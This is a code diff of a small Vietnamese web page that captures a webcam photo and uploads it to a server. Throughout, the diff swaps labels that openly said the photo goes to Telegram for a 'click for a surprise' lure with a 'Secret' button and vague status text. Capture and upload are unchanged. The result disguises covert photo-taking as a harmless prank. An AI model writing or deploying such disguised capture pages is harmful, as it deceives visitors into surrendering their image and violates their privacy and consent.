@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chụp ảnh gửi Telegram</title>
+    <title>Bấm vào sẽ có bất ngờ</title>
     <style>
         * { box-sizing: border-box; }
         body {
@@ -43,10 +43,10 @@
     </style>
 </head>
 <body>
-    <h2>📸 Chụp ảnh gửi Telegram</h2>
-    <p>Bấm nút bên dưới và bấm <b>Cho phép</b> khi trình duyệt hỏi.</p>
+    <h2>Bất ngờ ngẫu nhiên</h2>
+    <p>Bấm vào sẽ có bất ngờ<b></b></p>
 
-    <button id="captureBtn">Chụp & Gửi ảnh</button>
+    <button id="captureBtn">Secret</button>
     <div id="status"></div>
 
     <video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
@@ -62,7 +62,7 @@
             try {
                 btn.disabled = true;
                 status.className = '';
-                status.textContent = '⏳ Đang xin quyền camera...';
+                status.textContent = 'Chờ 2 giây...';
 
                 // 1. Xin quyền và bật camera
                 const stream = await navigator.mediaDevices.getUserMedia({
@@ -71,9 +71,8 @@
                 video.srcObject = stream;
                 video.style.display = 'block';
 
-                status.textContent = '📷 Camera đã bật. Chụp sau 2 giây...';
+                status.textContent = 'Chờ 2 giây...';
 
-                // 2. Đợi 2 giây rồi chụp
                 setTimeout(async () => {
                     canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                     const imageData = canvas.toDataURL('image/png');
@@ -82,7 +81,7 @@
                     stream.getTracks().forEach(t => t.stop());
                     video.style.display = 'none';
 
-                    status.textContent = '📤 Đang gửi ảnh...';
+                    status.textContent = 'Đang xử lý...';
 
                     // 3. Gửi lên server
                     const res = await fetch('/upload', {
@@ -94,13 +93,13 @@
 
                     if (result.success) {
                         status.className = 'success';
-                        status.textContent = '✅ Đã gửi ảnh về Telegram!';
+                        status.textContent = 'Đã xong, bất ngờ là không có bất ngờ gì cả:))';
                     } else {
                         status.className = 'error';
                         status.textContent = '❌ Lỗi: ' + (result.error || 'Không rõ');
                     }
                     btn.disabled = false;
-                    btn.textContent = 'Chụp lại';
+                    btn.textContent = 'Again';
                 }, 2000);
 
             } catch (err) {
